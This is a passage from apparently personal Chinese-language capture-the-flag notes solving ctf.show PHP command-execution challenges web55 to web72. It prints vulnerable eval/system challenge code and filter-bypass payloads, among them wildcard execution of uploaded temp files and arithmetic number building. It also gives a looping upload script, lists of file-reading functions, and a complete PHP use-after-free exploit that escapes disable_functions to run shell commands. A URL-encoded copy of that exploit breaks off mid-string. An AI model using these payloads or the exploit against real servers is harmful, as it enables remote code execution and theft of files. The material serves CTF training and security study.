<form action="http://200f2114-2431-4ddf-beaf-ac717d3fbfe6.challenge.ctf.show/" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>

```

- 第二步，随便上传个文件，然后抓包，在GET中传入参数执行，POST传入shell命令执行

![image-20231110144150381](assets/image-20231110144150381.png)
因为每次上传文件名都是随机的，可能不会一次成功，要多发几次包，看到目录文件后继续查看
![image-20231117105135097](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/image-20231117105135097.png)
成功读到flag

## web56（无数字字母命令执行）

```php
<?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

这次在上一题的基础上多过滤掉了数字，导致我们无法使用上题的payload。不过之前看过p师傅的一篇无字母数字webshell的文章，这里我们可以利用php的特性：如果我们发送一个上传文件的post包，php会将我们上传的文件保存在临时的文件夹下，并且默认的文件目录是/tmp/phpxxxxxx。文件名最后的6个字符是随机的大小写字母，而且最后一个字符大概率是大写字母。容易想到的匹配方式就是利用`？`进行匹配，即`???/?????????`，然而这不一定会匹配到我们上传的文件，这时候有什么办法呢？
在ascii码表中观察发现

![image-20231110145210794](assets/image-20231110145210794.png)

在大写字母A的前一个符号为`@`，大写字母Z的后一个字母为`[`，因此我们可以使用`[@-[]`来表示匹配大写字母，也就是变成了这样的形式：`???/????????[@-[]`，到这一步已经能匹配到了我们上传的文件，那限制了字母后该如何执行上传的文件呢？这里有个技巧，就是使用`. file`来执行文件，我们可以去操作看看
在目录下新建一个f.txt，内容为ls，我们使用`. /home/kali/ctf_tools/a/f.txt`来执行文件
![image-20231110145307952](assets/image-20231110145307952.png)
发现f.txt里的ls命令被成功执行，所以我们的完整payload就是

```php
?c=. /???/????????[@-[]
并且同时上传我们的文件，文件内容里面是命令
```

这里我们写个脚本

```python
import requests
while True:
    url = "http://92a3d8ba-280b-4cb8-bd47-58b577bb6204.chall.ctf.show:8080/?c=. /???/????????[@-[]"

    r = requests.post(url, files={"file": ("dota.txt", "cat flag.php")})
    flag = r.text.split('ctfshow')
    if len(flag) >1:
        print(r.text)
        break
```

运行完后成功获取到flag


## web57（过滤字母数字与通配符，shell中$(())构造）

```php
<?php

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

这个题要传参c=36，但是由过滤了数字，可以考虑如下方式绕过
看这个例子
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637860730620-1abfb4d1-6da2-4059-8157-4af44c08a0aa.png%2523)
为什么会输出0呢，因为在shell中$(())可做运算，当参数为空时，打印0，那如何得到36呢，我们对0取反，得到是-1，然后用37个-1相加得到-37，最后再取反就得到36了
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637860973823-e1cea168-21e7-4251-bd72-3f0ceef253e2.png%2523)
得到-1
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637861295855-95cea956-3cf8-43ec-82fd-f1be6b1e35a0.png%2523)
37次运算后得到-37，最后取反得到36
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1637861257944-40d23a4b-f17e-4f60-87d2-95400dff3a7e.png%2523)

```php
搞个脚本拿一下payload:
data = "$((~$(("+"$((~$(())))"*37+"))))"
print(data)
或   
get_reverse_number = "$((~$(({}))))" # 取反操作
negative_one = "$((~$(())))"		# -1
payload = get_reverse_number.format(negative_one*37)
print(payload)

payload：/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

右键查看源码即可获得flag



其他构造方法：

```php
echo ${#} //0 
echo ${##} //1 
echo $((${##}+${##})) //2 
echo $(($((${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##})))) //36
```



## web58-65（突破禁用函数）

## 补充读取目录

```php
print_r(glob("*")); // 列当前目录
print_r(glob("/*")); // 列根目录
print_r(scandir("."));
print_r(scandir("/"));
$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\n";}
$d=dir(".");while(false!==($f=$d->read())){echo$f."\n";}
$a=glob("/*");foreach($a as $value){echo $value."   ";}
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```

## 补充文件读取函数

```php
?c=echo(implode('---',scandir("/")));
?c=readgzfile('/flag.txt');
highlight_file($filename);
show_source($filename);
print_r(php_strip_whitespace($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); // var_dump
fread(fopen($filename,"r"), $size);
include($filename); // 非php代码
include_once($filename); // 非php代码
require($filename); // 非php代码
require_once($filename); // 非php代码
print_r(fread(popen("cat flag", "r"), $size));
print_r(fgets(fopen($filename, "r"))); // 读取一行
fpassthru(fopen($filename, "r")); // 从当前位置一直读取到 EOF
print_r(fgetcsv(fopen($filename,"r"), $size));
print_r(fgetss(fopen($filename, "r"))); // 从文件指针中读取一行并过滤掉 HTML 标记
print_r(fscanf(fopen("flag", "r"),"%s"));
print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组
```

```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

这8个题可以通杀
payload：c=show_source('flag.php');

## web66（突破禁用函数）

```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

show_source被禁用了，尝试另一种：c=highlight_file('flag.php');
![image-20231117105014830](assets/image-20231117105014830.png)
好家伙，看来路径变了，先看看都有哪些文件吧：c=print_r(scandir('.'));
![image-20231117105002397](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/image-20231117105002397.png)
当前目录没有，再瞅一眼根目录：c=print_r(scandir('/'));
![image-20231117104944850](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/image-20231117104944850.png)
找到你了！可恶的flag.txt
最终payload：c=highlight_file('/flag.txt');

```
c=print_r(scandir("/"));
c=highlight_file('/flag.txt');
```

## web67（突破禁用函数）

```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

尝试后发现print_r被禁用了，这次使用var_dump打印，按照上题的思路，查看根目录
payload: c=var_dump(scandir('/'));
![image-20231117104929857](assets/image-20231117104929857.png)
于是最终payload：c=highlight_file('/flag.txt');

## web68（突破禁用函数）

```php
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
```

代码看不到了，看报错是因为highlight_file()被禁用了，一样，看一眼根目录，找到flag.txt
payload：c=var_dump(scandir('/'));
![image-20231117104918009](assets/image-20231117104918009.png)
这次使用include包含flag.txt
payload：c=include('/flag.txt');
还可以用require函数，文档是这样说的：

> **include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。**
> **include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：**
>
> - **require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。**
> - **include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。**

## web69（突破禁用函数）

打开一看，还是highlight_file()函数被禁用，var_dump也被禁用了，这次使用var_export()
以下是文档说明

> **var_export() 函数用于输出或返回一个变量，以字符串形式表示。**
> **var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。**
> **PHP 版本要求: PHP 4 >= 4.2.0, PHP 5, PHP 7**

payload：c=var_export(scandir('/'));打印根目录文件
![image-20231117104901231](assets/image-20231117104901231.png)
最终payload：

```php
c=var_export(scandir('/'));打印根目录文件
c=include('/flag.txt');
```

## 补充读取目录

```php
print_r(glob("*")); // 列当前目录
print_r(glob("/*")); // 列根目录
print_r(scandir("."));
print_r(scandir("/"));
$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\n";}
$d=dir(".");while(false!==($f=$d->read())){echo$f."\n";}
$a=glob("/*");foreach($a as $value){echo $value."   ";}
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```

## 补充文件读取函数

```php
?c=echo(implode('---',scandir("/")));
?c=readgzfile('/flag.txt');
highlight_file($filename);
show_source($filename);
print_r(php_strip_whitespace($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); // var_dump
fread(fopen($filename,"r"), $size);
include($filename); // 非php代码
include_once($filename); // 非php代码
require($filename); // 非php代码
require_once($filename); // 非php代码
print_r(fread(popen("cat flag", "r"), $size));
print_r(fgets(fopen($filename, "r"))); // 读取一行
fpassthru(fopen($filename, "r")); // 从当前位置一直读取到 EOF
print_r(fgetcsv(fopen($filename,"r"), $size));
print_r(fgetss(fopen($filename, "r"))); // 从文件指针中读取一行并过滤掉 HTML 标记
print_r(fscanf(fopen("flag", "r"),"%s"));
print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组
```



## web70（突破禁用函数）

```php
Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14

Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15

Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21
你要上天吗？
```

没什么难度，和上一题一样的操作

最终payload：

```php
c=$d=opendir("../../../");while(false!==($f=readdir($d))){echo"$f\n";}
c=include('/flag.txt');
```



## web71（突破禁用函数）

```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

看源码后得知会将命令执行后的结果中的数字字母全部替换为?，让我们无法查看，解决也很简单，在第8行执行完eval后让代码结束即可。
最终payload：

```
c=include('/flag.txt');exit(); 
```

## web72（uaf脚本）

```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```

代码上没啥变化，但是实操中发现之前的姿势都不能用了，而且也不知道文件位置，先看一下当前目录
![image-20231110160355346](assets/image-20231110160355346.png)
没什么问题，看一下根目录

![image-20231110160640449](assets/image-20231110160640449.png)

根目录貌似无法查看了，换个姿势

```php
payload：
c=?><?php 
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f.' ');}
exit();
?>
或者：
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

这里?>是闭合前面的php，让我们后面的php生效，既然直接读不可行，那么就间接来读，遍历根目录下所有文件，然后逐次打印

```
open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开

disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空
```

发现flag0.txt，应该就是要找的文件了，这里直接读也是不行的，看了其他师傅的方法是要用uaf脚本进行命令执行，脚本如下，执行时要url编码

```php
<?php

function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
?>
```

```php
c=%3F%3E%3C%3Fphp%0A%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA